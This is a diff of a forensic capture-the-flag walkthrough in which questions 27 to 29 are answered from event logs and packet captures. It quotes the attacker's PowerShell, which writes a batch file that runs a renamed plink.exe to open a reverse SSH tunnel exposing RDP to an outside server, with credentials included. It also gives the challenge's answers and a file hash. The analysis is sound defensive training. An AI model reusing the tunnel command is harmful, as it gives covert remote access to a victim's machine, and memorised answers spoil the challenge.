@@ -590,21 +590,51 @@ SSH-*.*-*.** *******:******** *** ****** (*******) *.**
 
 #### Q27: There is a .bat file was created. Where is it? (Absolute Path including the filename)
 ```
-C:\Users\Victim\Documents\FXS.bat
+*:\*****\******\*********\***.***
+```
+- From evtx
+
+![batt](https://github.com/user-attachments/assets/e4b06d9f-98f3-498b-acc6-bfe4de6b5494)
+
+- From pcap: the attacker used base64 again to write the file.
+
+![image](https://github.com/user-attachments/assets/e8bf9fb3-421c-404e-ba61-86a9dbc59971)
+
+![image](https://github.com/user-attachments/assets/b85a76ac-4342-49a2-9a68-64a87b05a7c7)
+
+```
+$batchContent = 'echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l v1ctim -pw C@nt_D3f3nd -R 127.0.0.1:49800:192.168.20.147:3389 192.168.1.2'
+$batchFilePath = 'C:\Users\Victim\Documents\FXS.bat'
+Set-Content -Path $batchFilePath -Value $batchContent
 ```
 
+##### - Answer: `C:\Users\Victim\Documents\FXS.bat`
 
-#### Q29: As we noticed this hacker is smart. he never use the real filename. What is the real filename of the file he downloaded combined with its MD5 hash? <FILENAME.EXE>:MD5
+<br>
+
+#### Q28: As we noticed this hacker is smart. he never use the real filename. What is the real filename of the file he downloaded combined with its MD5 hash? <FILENAME.EXE>:MD5
 ```
-plink.exe:CC62BA67C1200202D1DA784EA0313408
 *****.***:********************************
 ```
+- Search for `ekern.exe` in event viewer and we got our answer, the real filename is Plink and md5=CC62BA67C1200202D1DA784EA0313408
 
-#### Q30: Like you did notice this batch will be used in Establishing SSH Connection. What is the IP address of SSH Server and its Port? (<ip_addr>:<port>)
+![image](https://github.com/user-attachments/assets/bea969e9-598d-4f96-8e00-e4cf53bd1894)
+
+
+##### - Answer: `plink.exe:CC62BA67C1200202D1DA784EA0313408`
+
+<br>
+
+#### Q29: Like you did notice this batch will be used in Establishing SSH Connection. What is the IP address of SSH Server and its Port? (<ip_addr>:<port>)
 ```
-192.168.1.2:443
 ***.***.*.*:***
 ```
+- FXS.bat content:
+```
+echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l v1ctim -pw C@nt_D3f3nd -R 127.0.0.1:49800:192.168.20.147:3389 192.168.1.2'
+```
+- Server IP = 192.168.1.2 , Port = 443 
+##### - Answer :  `192.168.1.2:443`
 
 #### Q31: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
 ```
